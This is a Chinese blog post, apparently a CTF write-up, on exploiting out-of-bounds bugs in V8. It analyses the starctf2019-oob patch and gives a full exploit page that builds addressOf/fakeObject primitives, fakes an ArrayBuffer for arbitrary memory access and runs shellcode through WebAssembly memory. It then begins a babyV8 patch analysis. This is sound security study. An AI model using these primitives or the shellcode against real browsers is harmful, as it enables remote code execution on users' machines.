<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;225443 0x00 前言总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。">
<meta property="og:type" content="article">
<meta property="og:title" content="OOB类型的v8逃逸总结">
<meta property="og:url" content="https://github.com/2020/12/25/v8-oob/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;225443 0x00 前言总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t01462128fe6acaa354.png">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t01a4de072f28369f9b.png">
<meta property="og:image" content="https://p5.ssl.qhimg.com/t015c7cb142f290922c.png">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t01cb0a26697f527b6e.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t01f85776de52c12000.png">
<meta property="og:image" content="https://p5.ssl.qhimg.com/t0171b06a0cc24db44d.png">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t01192cf4d59c3c83d0.png">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t0138511d34d43f8f2a.png">
<meta property="article:published_time" content="2020-12-25T02:30:19.000Z">
<meta property="article:modified_time" content="2025-06-26T09:18:14.819Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="JS引擎漏洞">
<meta property="article:tag" content="类型混淆">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p0.ssl.qhimg.com/t01462128fe6acaa354.png">

<link rel="canonical" href="https://github.com/2020/12/25/v8-oob/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>OOB类型的v8逃逸总结 | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2020/12/25/v8-oob/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          OOB类型的v8逃逸总结
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-12-25 10:30:19" itemprop="dateCreated datePublished" datetime="2020-12-25T10:30:19+08:00">2020-12-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225443">https://www.anquanke.com/post/id/225443</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。</p>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><p>OOB即缓冲区溢出，在v8中的OOB漏洞是比较容易利用的，一般的步骤就是利用OOB修改<code>ArrayBuffer</code>的<code>backing_store</code>和<code>byteLength</code>实现任意地址读写，也可以直接<code>OOB</code>读取和修改对象的<code>MAP</code>，构造<code>addressOf</code>和<code>fakeObject</code>原语。</p>
<h2 id="0x02-普通OOB"><a href="#0x02-普通OOB" class="headerlink" title="0x02 普通OOB"></a>0x02 普通OOB</h2><h3 id="0x02-00-starctf2019-oob"><a href="#0x02-00-starctf2019-oob" class="headerlink" title="0x02.00 starctf2019-oob"></a>0x02.00 starctf2019-oob</h3><h4 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len == 1)&#123;</span><br><span class="line">+        //read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        //write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<p>可以看到，patch为<code>Array</code>类型增加了一个新的函数叫<code>oob</code>，其具体处理的逻辑在<code>BUILTIN(ArrayOob)</code>函数里，当参数个数为1个时，进行读操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+        //read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br></pre></td></tr></table></figure>
<p>可以看到读操作溢出了一个单位，因为下标是以0开始的，同理当参数个数为2个时，进行写操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elements.set(length,value-&gt;Number());</span><br></pre></td></tr></table></figure>

<p>其中<code>BUILTIN(ArrayOob)</code>的第一个参数为<code>Array</code>本身，因此从<code>js</code>层面来看，oob接收的参数要么为0个要么为1个。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>要利用该漏洞，我们考虑使用<code>var a = [1.1,2.2,3.3]</code>这种<code>DOUBLE_ELEMENTS</code>类型的数组，因为这种数组里的数据是<code>unboxed</code>的，即没有包装为<code>HeapNumber</code>，elements里存的就是真值。在大多数情况下，这种类型的数组其elements在内存里的位置正好位于<code>Array</code>对象的上方，没有间隔。<br>测试以下代码，用gdb调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a = [1.1,2.2];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p><img src="https://p0.ssl.qhimg.com/t01462128fe6acaa354.png"><br>查看elements里，2.2这个数据后方是什么，可以发现是<code>Array</code>对象的MAP，而在v8里，如果能够控制对象MAP值，那么就可以造成类型混淆，轻松构造<code>addressOf</code>和<code>fakeObject</code>原语<br><img src="https://p4.ssl.qhimg.com/t01a4de072f28369f9b.png"><br>并且可以看到这个版本的v8没有<code>compression pointer</code>机制，因此<code>addressOf</code>获得的就是对象的完整地址，然后可以轻松伪造一个<code>ArrayBuffer</code>实现任意地址读写，写wasm的shellcode区域。<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">var a = [1.1];</span><br><span class="line">var unboxed_double_map = a.oob();</span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var b = [obj];</span><br><span class="line">var obj_element_map = b.oob();</span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   b[0] = obj;</span><br><span class="line">   b.oob(unboxed_double_map);</span><br><span class="line">   var addr = u64f(b[0]) - 0x1n;</span><br><span class="line">   b.oob(obj_element_map);</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   a[0] = i2f64(addr + 1n);</span><br><span class="line">   a.oob(obj_element_map);</span><br><span class="line">   var mobj = a[0];</span><br><span class="line">   a.oob(unboxed_double_map);</span><br><span class="line">   return mobj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line">//alert(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));</span><br><span class="line">wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;</span><br><span class="line">var element_addr = faker_addr - 0x50n;</span><br><span class="line">//print(&#x27;element_addr=&#x27; + element_addr.toString(16));</span><br><span class="line">//fake a ArrayBuffer&#x27;s Map</span><br><span class="line">faker[0] = i2f64(0n);</span><br><span class="line">faker[1] = i2f64(0x1900042317080808n);</span><br><span class="line">faker[2] = i2f64(0x00000000084003ffn);</span><br><span class="line">faker[3] = i2f64(0);</span><br><span class="line"></span><br><span class="line">//faker a ArrayBuffer</span><br><span class="line">faker[4] = i2f64(element_addr+0x1n); //map</span><br><span class="line">faker[5] = i2f64(0); //properties</span><br><span class="line">faker[6] = i2f64(0); //elements</span><br><span class="line">faker[7] = p64f(0xffffffff,0); //length</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line">faker[9] = 0x2;</span><br><span class="line"></span><br><span class="line">var arb_ArrayBuffer = fakeObject(element_addr+0x20n);</span><br><span class="line">var adv = new DataView(arb_ArrayBuffer);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">//alert(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="0x02-01-xnuca2020-babyV8"><a href="#0x02-01-xnuca2020-babyV8" class="headerlink" title="0x02.01 xnuca2020-babyV8"></a>0x02.01 xnuca2020-babyV8</h3><h4 id="patch分析-1"><a href="#patch分析-1" class="headerlink" title="patch分析"></a>patch分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.cc</span><br><span class="line">index 16fd384..8bf435a 100644</span><br><span class="line">--- a/src/codegen/code-stub-assembler.cc</span><br><span class="line">+++ b/src/codegen/code-stub-assembler.cc</span><br><span class="line">@@ -2888,7 +2888,7 @@ TNode&lt;Smi&gt; CodeStubAssembler::BuildAppendJSArray(ElementsKind kind,</span><br><span class="line">       [&amp;](TNode&lt;Object&gt; arg) &#123;</span><br><span class="line">         TryStoreArrayElement(kind, &amp;pre_bailout, elements, var_length.value(),</span><br><span class="line">                              arg);</span><br><span class="line">-        Increment(&amp;var_length);</span><br><span class="line">+        Increment(&amp;var_length, 3);</span><br><span class="line">       &#125;,</span><br><span class="line">       first);</span><br><span class="line">   &#123;</span><br></pre></td></tr></table></figure>
<p>查找该函数的上层调用，发现其在<code>TF_BUILTIN(ArrayPrototypePush, CodeStubAssembler)</code>函数里被调用，而<code>TF_BUILTIN(ArrayPrototypePush, CodeStubAssembler)</code>函数是js中的<code>Array.prototype.push</code>函数的具体实现，因此该漏洞与<code>push</code>操作有关。<br>patch以后，部分关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// Resize the capacity of the fixed array if it doesn&#x27;t fit.</span><br><span class="line">TNode&lt;IntPtrT&gt; first = arg_index-&gt;value();</span><br><span class="line">Node* growth = IntPtrToParameter(</span><br><span class="line">    IntPtrSub(UncheckedCast&lt;IntPtrT&gt;(args-&gt;GetLength(INTPTR_PARAMETERS)),</span><br><span class="line">              first),</span><br><span class="line">    mode);</span><br><span class="line">PossiblyGrowElementsCapacity(mode, kind, array, var_length.value(),</span><br><span class="line">                             &amp;var_elements, growth, &amp;pre_bailout);</span><br><span class="line"></span><br><span class="line">// Push each argument onto the end of the array now that there is enough</span><br><span class="line">// capacity.</span><br><span class="line">CodeStubAssembler::VariableList push_vars(&#123;&amp;var_length&#125;, zone());</span><br><span class="line">Node* elements = var_elements.value();</span><br><span class="line">args-&gt;ForEach(</span><br><span class="line">    push_vars,</span><br><span class="line">    [this, kind, mode, elements, &amp;var_length, &amp;pre_bailout](Node* arg) &#123;</span><br><span class="line">      TryStoreArrayElement(kind, mode, &amp;pre_bailout, elements,</span><br><span class="line">                           var_length.value(), arg);</span><br><span class="line">      Increment(&amp;var_length, 3, mode);</span><br><span class="line">    &#125;,</span><br><span class="line">    first, nullptr);</span><br><span class="line">&#123;</span><br><span class="line">  TNode&lt;Smi&gt; length = ParameterToTagged(var_length.value(), mode);</span><br><span class="line">  var_tagged_length = length;</span><br><span class="line">  StoreObjectFieldNoWriteBarrier(array, JSArray::kLengthOffset, length);</span><br><span class="line">  Goto(&amp;success);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中看到，在存储数据之前，先进行了扩容，但这个扩容的计算是根据元素的个数来算的，而patch后，原本每次push一个数据，末尾指针加1，现在加了3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Increment(&amp;var_length, 3, mode);</span><br></pre></td></tr></table></figure>
<p>最后，数据都push完成后，将var_length的值作为Array的length，这就导致了数组的length大于其本身elements的大小，导致了oob。</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先测试如下代码，用gdb调试</p>
